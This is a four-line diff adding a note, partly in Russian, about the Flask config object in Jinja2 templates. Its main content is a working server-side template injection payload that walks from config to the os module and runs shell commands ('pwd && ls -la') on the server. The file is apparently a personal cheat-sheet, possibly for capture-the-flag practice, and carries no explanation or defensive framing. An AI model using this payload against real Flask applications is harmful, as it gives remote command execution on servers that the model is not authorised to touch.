@@ -1,0 +1,4 @@
+jinja2
+config переменная во flask
+
+{{ config.__class__.__init__.__globals__['os'].popen('pwd && ls -la').read() }}
